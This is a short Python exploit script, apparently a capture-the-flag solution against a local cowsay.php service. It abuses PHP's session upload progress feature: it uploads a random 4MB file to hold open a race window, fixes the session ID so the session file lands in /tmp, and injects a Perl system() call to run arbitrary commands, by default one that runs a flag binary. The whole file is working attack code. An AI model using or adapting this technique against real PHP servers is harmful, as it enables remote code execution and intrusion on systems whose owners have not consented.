#!/usr/bin/env python3

import requests
from sys import argv

URL = "http://127.0.0.1:3007/cowsay.php"
UPLOAD_FILE = "/tmp/random-file"
PHPSESSID = "chenx3n"
SIZE = 4 * 1024**2 # 4MB

s = requests.Session()

def generate_randfile(size):
    with open("/dev/urandom", "rb") as f:
        data = f.read(size)
    with open(UPLOAD_FILE, "wb") as f:
        f.write(data)

def run(command):
    with open(UPLOAD_FILE, "rb") as f:
        # random 4MB file to be uploaded
        files = {"file": f}
        # PHPSESSID cookie, since it's set to "chenx3n", the session file will end up being "/tmp/sess_chenx3n"
        cookies = {"PHPSESSID": PHPSESSID}
        # inject perl code in PHP_SESSION_UPLOAD_PROGRESS post variable
        data = {"PHP_SESSION_UPLOAD_PROGRESS": f';system "{command}";#'}
        # trigger session file creation
        s.post(url=URL, files=files, data=data, cookies=cookies)

if __name__ == "__main__":
    cmd = argv[1] if len(argv) > 1 else "id;ls;./flag.runme"
    # generate a random 4MB file so that we have a sufficient time window before the session file is deleted on the server
    generate_randfile(SIZE)
    run(cmd)
